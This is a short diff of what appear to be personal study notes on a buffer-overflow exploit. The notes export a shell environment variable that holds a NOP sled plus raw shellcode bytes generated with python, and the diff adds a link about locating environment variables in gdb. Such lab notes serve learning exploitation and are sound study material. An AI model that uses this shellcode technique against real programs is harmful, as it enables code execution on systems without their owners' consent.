@@ -124,7 +124,7 @@ The new shellcode is this
 
 I am not using echo here instead I am using python 
 
-# set env var with NOP sled + shellcode
+
 export SHELLCODE=$(python3 -c '
 import sys
 buf  = b"\x90" * 100
@@ -136,4 +136,8 @@ buf += b"\x4c\x84\x15\x84\xa4\xa3\x77\xed\xca\xa3\x66\xec"
 buf += b"\xa4\xdb\x46\x0d\x45\x41\x95\x84"
 sys.stdout.buffer.write(buf)
 ')
-        
+
+https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow
+
+![[Pasted image 20260701185358.png]]
+![[Pasted image 20260701185819.png]]
